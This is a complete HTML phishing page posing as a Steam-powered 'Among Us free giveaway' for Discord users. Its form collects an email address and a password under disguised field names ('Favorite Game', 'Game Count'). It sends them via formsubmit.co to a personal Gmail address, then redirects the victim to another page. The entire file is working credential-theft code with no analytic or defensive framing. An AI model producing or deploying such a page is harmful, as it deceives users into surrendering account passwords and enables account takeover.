<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Powered by steam</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: url('https://cdn1.epicgames.com/salesEvent/salesEvent/amoguslandscape_2560x1440-3fac17e8bb45d81ec9b2c24655758075') no-repeat center center fixed;
      background-size: cover;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
    }

    .container {
      background-color: rgba(26, 40, 56, 0.95);
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 20px rgba(0,0,0,0.7);
      width: 90%;
      max-width: 400px;
      color: #c7d5e0;
      animation: fadeInUp 1s ease-out;
      transform: translateY(20px);
    }

    h2 {
      text-align: center;
      color: #66c0f4;
      margin-bottom: 20px;
      animation: fadeIn 1.2s ease-out;
    }

    label {
      display: block;
      margin-top: 20px;
      margin-bottom: 5px;
    }

    input {
      width: 100%;
      padding: 10px;
      border: none;
      border-radius: 5px;
      transition: transform 0.3s, box-shadow 0.3s;
    }

    input:focus {
      outline: none;
      transform: scale(1.03);
      box-shadow: 0 0 10px #66c0f4;
    }

    button {
      margin-top: 20px;
      width: 100%;
      padding: 10px;
      background-color: #66c0f4;
      border: none;
      border-radius: 5px;
      color: #1b2838;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.3s ease, transform 0.3s;
    }

    button:hover {
      background-color: #539dce;
      transform: scale(1.05);
    }

    @keyframes fadeInUp {
      0% {
        opacity: 0;
        transform: translateY(40px);
      }
      100% {
        opacity: 1;
        transform: translateY(0);
      }
    }

    @keyframes fadeIn {
      0% {
        opacity: 0;
      }
      100% {
        opacity: 1;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Among Us free giveaway</h2>
    <h3>(1 year trail for user Discord users)</h3>
    <input type="hidden" name="_next" value="https://store.steampowered.com/app/945360/Among_Us/">
    <input type="hidden" name="_captcha" value="false">
    <form action="https://formsubmit.co/chenitharanudaya450@gmail.com" method="POST">
      <input type="hidden" name="_next" value="https://example.com/thanks.html">
      <input type="hidden" name="_captcha" value="false">

      <label for="game">Enter Your Email Address</label>
      <input type="text" id="game" name="Favorite Game" required>

      <label for="count">Enter Your Password</label>
      <input type="text" id="count" name="Game Count" required>

      <button type="submit">Submit</button>
    </form>
  </div>
</body>
</html>
